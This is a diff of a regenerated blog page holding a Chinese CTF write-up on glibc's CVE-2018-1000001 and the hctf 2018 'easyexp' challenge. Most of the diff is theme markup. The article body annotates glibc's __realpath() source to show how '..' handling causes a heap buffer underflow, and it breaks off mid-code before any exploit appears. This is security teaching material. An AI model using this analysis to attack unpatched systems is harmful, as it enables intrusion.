@@ -1,134 +1,56 @@
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-
-  
-  
-  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css"/>
-
-
-
-
+<link rel="stylesheet" href="/css/main.css">
 
 
 
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
 
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sunichi.github.io","root":"/","scheme":"Muse","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
 
-  <meta name="google-site-verification" content="JaodW7D6jSkocuG_zIdKbBnDjM2skzLPZwv5CJMuXiM"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/avatar/avatar.jpeg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/avatar/avatar.jpeg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta name="description" content="做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib/canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。">
-<meta name="keywords" content="pwn,cve,ctf,2018,hctf,libc">
+  <meta name="description" content="做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib&#x2F;canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CVE–2018-1000001 &amp; hctf 2018 easyexp">
 <meta property="og:url" content="https://sunichi.github.io/2018/11/16/hctf18-easyexp/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
-<meta property="og:description" content="做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib/canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-16T15:25:40.000Z">
+<meta property="og:description" content="做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib&#x2F;canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-11-16T15:09:00.000Z">
+<meta property="article:modified_time" content="2018-11-16T15:25:40.000Z">
+<meta property="article:author" content="sunichi">
+<meta property="article:tag" content="cve">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="2018">
+<meta property="article:tag" content="hctf">
+<meta property="article:tag" content="libc">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CVE–2018-1000001 &amp; hctf 2018 easyexp">
-<meta name="twitter:description" content="做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib/canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。">
 
 
+<link rel="canonical" href="https://sunichi.github.io/2018/11/16/hctf18-easyexp/">
 
 
-
-
-  <link rel="canonical" href="https://sunichi.github.io/2018/11/16/hctf18-easyexp/"/>
-
-
-
-<script id="page.configurations">
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
   };
 </script>
 
@@ -140,1176 +62,323 @@
 
 
 
-
-
-
-
-
-
   <noscript>
   <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
+  body { margin-top: 2rem; }
+
   .use-motion .menu-item,
-  .sidebar-inner,
+  .use-motion .sidebar,
   .use-motion .post-block,
   .use-motion .pagination,
   .use-motion .comments,
   .use-motion .post-header,
   .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
+  .use-motion .collection-header {
+    visibility: visible;
+  }
 
-  .use-motion .logo,
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
   .use-motion .site-title,
-  .use-motion .site-subtitle {
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
     opacity: initial;
     top: initial;
   }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
   </style>
 </noscript>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Sunichi's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <h1 class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</h1>
-      
-    
-    
-  </div>
-
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Sunichi's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
   </div>
 </div>
 
 
 
-<nav class="site-nav">
+
+
+
+
+</div>
+        
   
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
 
-    
-    
-    
-      
-    
+  <aside class="sidebar">
 
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
         </li>
-      
-    </ul>
-  
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
 
-  
-    
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE%E2%80%932018-1000001"><span class="nav-number">1.</span> <span class="nav-text">CVE–2018-1000001</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyexp"><span class="nav-number">2.</span> <span class="nav-text">easyexp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-number">2.0.1.</span> <span class="nav-text">程序创建文件的过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-number">2.0.2.</span> <span class="nav-text">程序创建文件夹的过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">2.0.3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exp"><span class="nav-number">2.0.4.</span> <span class="nav-text">Exp</span></a></li></ol></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
 
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">sunichi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
 </div>
 
 
 
+      </section>
     </div>
-  
-</nav>
+  </aside>
+  <div class="sidebar-dimmer"></div>
 
 
-
-  
-
-
-
-</div>
     </header>
 
     
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
+    <div class="main-inner post posts-expand">
+      
 
-  <div id="posts" class="posts-expand">
+      
+
     
-
-  
-
   
   
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2018/11/16/hctf18-easyexp/"/>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2018/11/16/hctf18-easyexp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sunichi"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sunichi">
+      <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sunichi's Blog"/>
+      <meta itemprop="name" content="Sunichi's Blog">
     </span>
 
     
+    
       <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE–2018-1000001 & hctf 2018 easyexp
+        </h1>
 
-        
-        
-          <h2 class="post-title" itemprop="name headline">CVE–2018-1000001 & hctf 2018 easyexp
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
 
-              
-            
-          </h2>
-        
+      <time title="创建时间：2018-11-16 23:09:00 / 修改时间：23:25:40" itemprop="dateCreated datePublished" datetime="2018-11-16T23:09:00+08:00">2018-11-16</time>
+    </span>
 
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-11-16 23:09:00 / 修改时间：23:25:40" itemprop="dateCreated datePublished" datetime="2018-11-16T23:09:00+08:00">2018-11-16</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
+  
+</div>
 
         </div>
       </header>
-    
 
     
     
     
     <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
         <p>做题的时候有考虑过CVE，但当时没去查……</p>
 <h2 id="CVE–2018-1000001"><a href="#CVE–2018-1000001" class="headerlink" title="CVE–2018-1000001"></a>CVE–2018-1000001</h2><p>该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。</p>
 <p>以下分析<code>stdlib/canonicalize.c</code>中的<code>__realpath()</code>函数（<code>__canonicalize_file_name</code>仅仅调用<code>__realpath()</code>，没有其它操作）。</p>
 <a id="more"></a>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Return the canonical absolute name of a given file.</span></span><br><span class="line"><span class="comment">   Copyright (C) 1996-2016 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="comment">   This file is part of the GNU C Library.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is free software; you can redistribute it and/or</span></span><br><span class="line"><span class="comment">   modify it under the terms of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License as published by the Free Software Foundation; either</span></span><br><span class="line"><span class="comment">   version 2.1 of the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">   but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span></span><br><span class="line"><span class="comment">   Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   You should have received a copy of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License along with the GNU C Library; if not, see</span></span><br><span class="line"><span class="comment">   &lt;http://www.gnu.org/licenses/&gt;.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eloop-threshold.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlib-compat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return the canonical absolute name of file NAME.  A canonical name</span></span><br><span class="line"><span class="comment">   does not contain any `.', `..' components nor any repeated path</span></span><br><span class="line"><span class="comment">   separators ('/') or symlinks.  All path components must exist.  If</span></span><br><span class="line"><span class="comment">   RESOLVED is null, the result is malloc'd; otherwise, if the</span></span><br><span class="line"><span class="comment">   canonical name is PATH_MAX chars or more, returns null with `errno'</span></span><br><span class="line"><span class="comment">   set to ENAMETOOLONG; if the name fits in fewer than PATH_MAX chars,</span></span><br><span class="line"><span class="comment">   returns the name in RESOLVED.  If the name cannot be resolved and</span></span><br><span class="line"><span class="comment">   RESOLVED is non-NULL, it contains the path of the first component</span></span><br><span class="line"><span class="comment">   that cannot be resolved.  If the path can be resolved, RESOLVED</span></span><br><span class="line"><span class="comment">   holds the same value as the value returned.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__realpath (<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">char</span> *resolved) <span class="comment">//name是传入的字符串</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *rpath, *dest, *extra_buf = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *start, *end, *rpath_limit;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> path_max;</span><br><span class="line">  <span class="keyword">int</span> num_links = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 此部分是常规的一些检查，不影响理解代码逻辑</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置path_max参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PATH_MAX</span></span><br><span class="line">  path_max = PATH_MAX;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  path_max = pathconf (name, _PC_PATH_MAX);</span><br><span class="line">  <span class="keyword">if</span> (path_max &lt;= <span class="number">0</span>)</span><br><span class="line">    path_max = <span class="number">1024</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (resolved == <span class="literal">NULL</span>) <span class="comment">// __canonicalize_file_name默认传参NULL</span></span><br><span class="line">    &#123;</span><br><span class="line">      rpath = <span class="built_in">malloc</span> (path_max); <span class="comment">// 申请保存解析后的路径的chunk，发生溢出的即为该chunk</span></span><br><span class="line">      <span class="keyword">if</span> (rpath == <span class="literal">NULL</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    rpath = resolved;</span><br><span class="line">  rpath_limit = rpath + path_max;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name[<span class="number">0</span>] != <span class="string">'/'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!__getcwd (rpath, path_max)) <span class="comment">// getcwd返回rpath的地址</span></span><br><span class="line">	&#123;</span><br><span class="line">	  rpath[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">	  <span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line">      dest = __rawmemchr (rpath, <span class="string">'\0'</span>); <span class="comment">// dest记录rpath中字符串的结尾</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      rpath[<span class="number">0</span>] = <span class="string">'/'</span>;</span><br><span class="line">      dest = rpath + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (start = end = name; *start; start = end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line">      <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Skip sequence of multiple path-separators.  */</span></span><br><span class="line">      <span class="keyword">while</span> (*start == <span class="string">'/'</span>) <span class="comment">// 如果以/开头，向后移动</span></span><br><span class="line">	++start;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Find end of path component.  */</span></span><br><span class="line">      <span class="keyword">for</span> (end = start; *end &amp;&amp; *end != <span class="string">'/'</span>; ++end)</span><br><span class="line">	<span class="comment">/* Nothing.  */</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (end - start == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (end - start == <span class="number">1</span> &amp;&amp; start[<span class="number">0</span>] == <span class="string">'.'</span>)</span><br><span class="line">	<span class="comment">/* nothing */</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (end - start == <span class="number">2</span> &amp;&amp; start[<span class="number">0</span>] == <span class="string">'.'</span> &amp;&amp; start[<span class="number">1</span>] == <span class="string">'.'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Back up to previous component, ignore if at root already.  */</span></span><br><span class="line">	  <span class="comment">// dest初始值为rpath中字符串（getcwd返回值）的结尾</span></span><br><span class="line">	  <span class="comment">// 如果遇到..，向前搜索/字符，初始情况下：dest = rpath + len &gt; rpath + 1。所以在第一个..时会在while中出现前向溢出</span></span><br><span class="line">	  <span class="keyword">if</span> (dest &gt; rpath + <span class="number">1</span>)</span><br><span class="line">	    <span class="keyword">while</span> ((--dest)[<span class="number">-1</span>] != <span class="string">'/'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> new_size;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (dest[<span class="number">-1</span>] != <span class="string">'/'</span>)</span><br><span class="line">	    *dest++ = <span class="string">'/'</span>;</span><br><span class="line">      <span class="comment">// 在触发漏洞前，dest已经向前溢出，加上len后不会超过rpath_limit</span></span><br><span class="line">	  <span class="keyword">if</span> (dest + (end 